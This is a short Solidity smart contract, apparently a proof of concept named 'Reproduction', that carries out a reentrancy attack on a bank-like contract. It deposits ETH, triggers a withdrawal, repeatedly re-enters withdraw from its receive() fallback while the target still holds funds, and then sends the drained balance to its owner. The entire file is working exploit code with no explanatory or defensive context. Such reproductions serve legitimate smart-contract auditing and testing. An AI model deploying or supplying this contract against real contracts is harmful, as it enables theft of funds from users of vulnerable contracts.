interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public target;
    address public owner;

    constructor(address _target) {
        target = IBank(_target);
        owner = msg.sender;
    }

    function setup() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Must send ETH");
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner, "Only owner");
        target.withdraw(amount);
    }

    receive() external payable {
        uint targetBalance = address(target).balance;
        if (targetBalance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    function finalize() external {
        require(msg.sender == owner, "Only owner");
        _transfer();
    }

    function _transfer() internal {
        payable(owner).transfer(address(this).balance);
    }
}